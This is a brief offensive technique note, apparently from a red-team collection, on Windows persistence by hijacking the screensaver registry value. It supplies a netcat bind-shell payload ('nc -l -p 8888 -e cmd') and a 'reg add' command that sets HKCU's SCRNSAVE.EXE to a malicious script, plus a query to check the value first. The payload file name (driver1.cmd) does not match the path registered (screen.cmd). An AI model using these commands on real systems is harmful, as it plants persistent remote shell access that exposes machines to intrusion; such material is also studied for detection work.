# ScreenSaver Hijack

 we can modify SCRNSAVE.EXE value in the registry  HKCU\Control Panel\Desktop\ and change its data to point to any malicious file

### malicious payload

#### driver1.cmd

```
nc -l -p 8888 -e cmd
```

### Befor add malicious payload

```
reg query "hkcu\control panel\desktop" /v SCRNSAVE.EXE
```

### Add malicious payload

```
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d E:\presistent\screen.cmd
```
